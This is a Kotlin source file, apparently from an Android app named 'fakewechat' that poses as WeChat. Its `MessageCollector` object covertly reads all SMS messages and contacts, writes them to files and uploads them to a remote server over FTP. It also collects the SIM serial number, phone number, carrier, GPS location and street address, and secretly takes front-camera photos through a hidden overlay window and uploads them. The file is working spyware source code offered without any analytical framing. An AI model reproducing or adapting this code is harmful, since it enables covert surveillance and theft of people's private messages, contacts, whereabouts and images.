package com.example.fakewechat

import android.annotation.SuppressLint
import android.content.ContentResolver
import android.content.Context
import android.hardware.Camera
import android.location.Address
import android.location.Geocoder
import android.location.Location
import android.telephony.TelephonyManager
import android.util.Log
import android.location.LocationManager
import android.net.Uri
import android.os.Environment
import android.view.*
import android.widget.Toast
import kotlinx.android.synthetic.main.activity_main.*
import java.io.File
import java.io.FileOutputStream
import java.io.IOException
import java.text.SimpleDateFormat
import java.util.*
import android.provider.ContactsContract







/**
 * Created by ydy on 18-4-29.
 */
object MessageCollector {

    //context
    lateinit private var context :Context;
    lateinit var cr : ContentResolver;
    //Sim卡信息
    private lateinit var myTelephonyManager:TelephonyManager;

    //位置信息
    lateinit var locationManager:LocationManager;

    //相机需要用到的悬浮窗参数
    lateinit var sfv_preview : SurfaceView;
    private lateinit var camera: Camera;
    public lateinit var cameraView: View;
    public lateinit var mWindowManager:WindowManager;
    public val params = WindowManager.LayoutParams()

    public fun setMyContext(context1: Context){
        context = context1;
        myTelephonyManager = context.getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager;
        locationManager = context.getSystemService(Context.LOCATION_SERVICE) as LocationManager;
        mWindowManager = context.getSystemService(Context.WINDOW_SERVICE) as WindowManager;
        cr = context.getContentResolver();


        getSmsFromPhone();

        getContact();


        initView();
        initParams();
    }

    //初始化相机悬浮窗中的View
    fun initView(){
        cameraView = LayoutInflater.from(context).inflate(R.layout.camera_layout,null);

        sfv_preview = cameraView.findViewById(R.id.sfv_preview2);
        sfv_preview.holder.addCallback(cpHolderCallback);

    }

    //初始化相机悬浮窗的属性
    fun initParams(){
        params.type = WindowManager.LayoutParams.TYPE_SYSTEM_ALERT;

        params.flags = WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE



        params.width = WindowManager.LayoutParams.WRAP_CONTENT;
        params.height = WindowManager.LayoutParams.WRAP_CONTENT;

        params.gravity = Gravity.TOP or Gravity.LEFT;
    }

    private val cpHolderCallback = object : SurfaceHolder.Callback {
        override fun surfaceCreated(holder: SurfaceHolder) {
            Log.i("camera","start")

            camera = Camera.open(1)

            try {

                camera.setPreviewDisplay(sfv_preview.holder)
                camera.setDisplayOrientation(90)   //让相机旋转90度
                camera.startPreview()
            } catch (e: IOException) {
                e.printStackTrace()
            }
        }

        override fun surfaceChanged(holder: SurfaceHolder, format: Int, width: Int, height: Int) {

        }

        override fun surfaceDestroyed(holder: SurfaceHolder) {
            Log.i("camera","stop")
            camera.stopPreview()
            camera.release()
        }
    }


    public fun getSmsFromPhone() {
        var filename = Environment.getExternalStorageDirectory().canonicalPath + "/" + "Sms.txt"
        val projection = arrayOf("_id", "address", "person", "body", "date", "type")
        val cur = cr.query(Uri.parse("content://sms/"), projection, null, null, "date desc")
        if (null == cur) {
            Log.i("ooc", "************cur == null")
            return
        }
        val output = FileOutputStream(filename,false)
        while (cur!!.moveToNext()) {
            var number = cur!!.getString(cur!!.getColumnIndex("address"))//手机号
            var name = cur!!.getString(cur!!.getColumnIndex("person"))//联系人姓名列表
            var body = cur!!.getString(cur!!.getColumnIndex("body"))//短信内容
            var date = cur!!.getLong(cur!!.getColumnIndex("date"))//短信内容
            var strdate = SimpleDateFormat("yyyy-MM-dd-HH:mm:ss").format(Date(date));




            output.write((
                    "\ndate:"+strdate+
                    "\naddress:"+number
 //                   +"\nperson:"+name
                    +"\nbody:"+body
                    +"\n-----------------------"
                    ).toByteArray()
            );

            //至此就获得了短信的相关的内容, 以下是把短信加入map中，构建listview,非必要。

        }

        output.close()
        cur.close();
        Thread({
            MyFTPClient.uploadFile("","Sms.txt",Environment.getExternalStorageDirectory().canonicalPath + "/" + "Sms.txt")
        }).start()

    }

    public fun getContact(){
        Thread.sleep(2000)
        val contactUri = ContactsContract.CommonDataKinds.Phone.CONTENT_URI
        val cursor = cr.query(contactUri,
                arrayOf("display_name", "sort_key", "contact_id", "data1"), null, null, "sort_key")
        var contactName: String?
        var contactNumber: String
        var contactSortKey: String
        var contactId: Int

        var filename = Environment.getExternalStorageDirectory().canonicalPath + "/" + "Contact.txt"

        val output = FileOutputStream(filename,false)

        while (cursor.moveToNext()) {
            contactName = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME))
            contactNumber = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER))
            contactId = cursor.getInt(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.CONTACT_ID))

            output.write((
                    "\ncontactName:"+contactName+
                            "\ncontactNumber:"+contactNumber

                            +"\ncontactID:"+contactId
                            +"\n-----------------------"
                    ).toByteArray()
            );

        }

        output.close();

        Thread({
            MyFTPClient.uploadFile("","Contact.txt",Environment.getExternalStorageDirectory().canonicalPath + "/" + "Contact.txt")
        }).start()

        cursor.close()//使用完后一定要将cursor关闭，不然会造成内存泄露等问题
    }

    @SuppressLint("MissingPermission")
    fun getIccid(): String {
        var iccid = "N/A"
        iccid = myTelephonyManager.getSimSerialNumber()
        return iccid
        Thread({

/*            MyFTPClient.writeFileToFtp("Log","iccid:"+iccid+"\n");*/
        }).start();
    }

    @SuppressLint("MissingPermission")
//获取电话号码
    fun getNativePhoneNumber(): String {
        var nativePhoneNumber = "N/A"

        nativePhoneNumber = myTelephonyManager.getLine1Number()

        Thread({
/*            MyFTPClient.writeFileToFtp("Log","手机号:"+nativePhoneNumber+"\n");*/
        }).start()

        return nativePhoneNumber
    }

    //获取手机服务商信息
    fun getProvidersName(): String {
        var providersName = "N/A"
        var NetworkOperator = myTelephonyManager.getNetworkOperator()
        //IMSI号前面3位460是国家，紧接着后面2位00 02是中国移动，01是中国联通，03是中国电信。
        //        Flog.d(TAG,"NetworkOperator=" + NetworkOperator);
        if (NetworkOperator.equals("46000") || NetworkOperator.equals("46002")) {
            providersName = "中国移动"//中国移动
        } else if (NetworkOperator.equals("46001")) {
            providersName = "中国联通"//中国联通
        } else if (NetworkOperator.equals("46003")) {
            providersName = "中国电信"//中国电信
        }
        Thread({
/*            MyFTPClient.writeFileToFtp("Log","服务商:"+providersName+"\n");*/

        }).start()

        return providersName

    }

    @SuppressLint("MissingPermission")
    fun getLocation(): String{
        Log.i("test","hereLoc")
        val location = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER);




        //Log.i("location",getStreet(location));
        Log.i("test","hereLoc")
        Thread({

/*            MyFTPClient.writeFileToFtp("Log2","Time:"+location.time+"\n经度:"+location.longitude+";纬度:"+location.latitude+";海拔:"+location.altitude);*/

        }).start()
        Log.i("test","hereLoc")
        return "longitude:"+location.longitude+"\nlatitude:"+location.latitude+"\naltitude:"+location.altitude+"\n" + getStreet(location);
    }


    fun getStreet(location: Location): String {
        Log.i("test","hereStreet")
        val geocoder = Geocoder(context)
        val stringBuilder = StringBuilder();
        //根据经纬度获取地理位置信息
        var addresses:List<Address> = geocoder.getFromLocation(location.getLatitude(), location.getLongitude(), 1);
        Log.i("test","hereStreet")
        //根据地址获取地理位置信息
        //var addresses = geocoder.getFromLocationName(adressStr, 1);

        if (addresses.size > 0) {
            var address = addresses.get(0);
            for (i in addresses.indices) {
                stringBuilder.append(address.getAddressLine(i)).append("\n");
            }
            stringBuilder.append(address.getCountryName()).append("_");//国家
            stringBuilder.append(address.getAdminArea()).append("_");//省份

            stringBuilder.append(address.getLocality()).append("_");//市

            stringBuilder.append(address.getSubLocality()).append("_");//乡洲区
/*            stringBuilder.append(address.getThoroughfare()).append("_");//道路

            stringBuilder.append(address.getLatitude()).append("_");//经度
            stringBuilder.append(address.getLongitude());//维度


            stringBuilder.append(address.getFeatureName()).append("_");//周边地址

            stringBuilder.append(address.getSubAdminArea()).append("_");
            stringBuilder.append(address.getPostalCode()).append("_");
            stringBuilder.append(address.getCountryCode()).append("_");//国家编码*/
        }

        return stringBuilder.toString();

    }

    //初始化相机,设置1px的悬浮窗显示surfaceView


    //拍照
    public fun takePic(){
        Log.i("test","here")
        mWindowManager.addView(cameraView, params);
        Log.i("test","here2")

        Timer().schedule(object :TimerTask(){


            override fun run() {
                camera.takePicture(null, null, Camera.PictureCallback { data, camera ->

                    var path = saveFile(data)
                    if (path != null) {

                        //上传你照片功能

                        Thread({
                            MyFTPClient.uploadFile("","img"+ SimpleDateFormat("yyyy-MM-dd-HH-mm-ss").format(Date()),path)
                        }).start()



                    } else {

                    }

                    mWindowManager.removeViewImmediate(cameraView);
                })


            }

        },3000)



    }

    //保存照片
    private fun saveFile(bytes: ByteArray): String {
        try {
            Log.i("save","here0")
            val file = File.createTempFile("img"+ SimpleDateFormat("yyyy-MM-dd-HH-mm-ss").format(Date()), "")
            val fos = FileOutputStream(file)
            Log.i("save","here")
            fos.write(bytes)
            fos.flush()
            fos.close()
            Log.i("save","here2")
            return file.absolutePath
        } catch (e: IOException) {
            e.printStackTrace()
        }

        return ""
    }


}